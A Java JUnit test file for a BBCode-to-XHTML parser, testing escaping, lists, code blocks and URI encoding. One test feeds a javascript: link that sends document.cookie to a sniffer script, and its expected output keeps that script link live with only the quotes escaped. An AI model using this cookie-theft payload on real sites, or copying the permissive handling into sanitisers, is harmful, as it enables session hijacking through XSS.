package ru.org.linux.util.bbcode;

import junit.framework.Assert;
import org.junit.Test;

import org.apache.commons.httpclient.util.URIUtil;

/**
 * Created by IntelliJ IDEA.
 * User: hizel
 * Date: 7/5/11
 * Time: 11:15 PM
 */
public class OldParseTest {
    @Test
    public void pTest(){
        Assert.assertEquals(ParserUtil.bb2xhtml("test\ntest1\n\ntest2", null), "test\ntest1<p>test2</p>");
    }

    @Test
    public void tagEscapeTest(){
        Assert.assertEquals(ParserUtil.bb2xhtml("<br>", null), "&lt;br&gt;");
    }

    @Test
    public void urlEscapeTest(){
        Assert.assertEquals(ParserUtil.bb2xhtml(
                "[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]", null),
                "<a href=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">Test</a>");
    }

    @Test
    public void badListTest(){
        Assert.assertEquals(ParserUtil.bb2xhtml("[list]0[*]1[*]2[/list]", null), "<ul></ul>0<ul><li>1</li><li>2</li></ul>");
    }

    @Test
    public void codeEscapeTest(){
        Assert.assertEquals(ParserUtil.bb2xhtml("[code]\"code&code\"[/code]", null), "<div class=\"code\"><pre class=\"no-highlight\"><code>&quot;code&amp;code&quot;</code></pre></div>");
    }

    @Test
    public void uriTest(){
        try{
            Assert.assertEquals(URIUtil.encodeQuery("http://search.barnesandnoble.com/booksearch/first book.pdf"), "http://search.barnesandnoble.com/booksearch/first%20book.pdf");
        }catch (Exception ex){
            Assert.assertFalse(true);
        }
    }

}